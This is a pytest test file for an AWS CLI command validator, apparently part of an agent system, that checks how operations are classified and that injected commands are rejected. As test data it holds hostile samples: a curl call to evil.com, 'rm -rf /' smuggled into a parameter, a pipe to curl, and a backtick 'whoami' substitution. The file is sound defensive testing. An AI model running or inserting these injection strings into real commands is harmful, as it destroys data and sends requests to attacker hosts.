import pytest
from agent.models import CLICommand, OperationCategory
from aws.cli_validator import CLICommandValidator

class TestCLIValidator:
    def setup_method(self):
        self.validator = CLICommandValidator()
    
    def test_valid_command(self):
        cmd = CLICommand(
            service='ec2', action='describe-instances',
            parameters={}, description='List instances',
            operation_category=OperationCategory.READ_ONLY
        )
        is_valid, issues = self.validator.validate_command(cmd)
        assert is_valid
    
    def test_invalid_service(self):
        cmd = CLICommand(
            service='curl', action='http://evil.com',
            parameters={}, description='Bad command',
            operation_category=OperationCategory.READ_ONLY
        )
        is_valid, issues = self.validator.validate_command(cmd)
        assert not is_valid
    
    def test_shell_injection_in_params(self):
        cmd = CLICommand(
            service='ec2', action='run-instances',
            parameters={'image-id': 'ami-123; rm -rf /'},
            description='Injection attempt',
            operation_category=OperationCategory.WRITE
        )
        is_valid, issues = self.validator.validate_command(cmd)
        assert not is_valid
    
    def test_classify_read_only(self):
        category = self.validator.classify_operation('ec2', 'describe-instances')
        assert category == OperationCategory.READ_ONLY
    
    def test_classify_write(self):
        category = self.validator.classify_operation('ec2', 'run-instances')
        assert category == OperationCategory.WRITE
    
    def test_classify_destructive(self):
        category = self.validator.classify_operation('ec2', 'terminate-instances')
        assert category == OperationCategory.DESTRUCTIVE
    
    def test_classify_delete(self):
        category = self.validator.classify_operation('s3api', 'delete-bucket')
        assert category == OperationCategory.DESTRUCTIVE
    
    def test_classify_list(self):
        category = self.validator.classify_operation('s3api', 'list-buckets')
        assert category == OperationCategory.READ_ONLY

    def test_pipe_injection(self):
        cmd = CLICommand(
            service='ec2', action='describe-instances',
            parameters={'filters': 'Name=tag:Name | curl evil.com'},
            description='Pipe injection',
            operation_category=OperationCategory.READ_ONLY
        )
        is_valid, issues = self.validator.validate_command(cmd)
        assert not is_valid

    def test_backtick_injection(self):
        cmd = CLICommand(
            service='s3api', action='create-bucket',
            parameters={'bucket': '`whoami`-bucket'},
            description='Backtick injection',
            operation_category=OperationCategory.WRITE
        )
        is_valid, issues = self.validator.validate_command(cmd)
        assert not is_valid
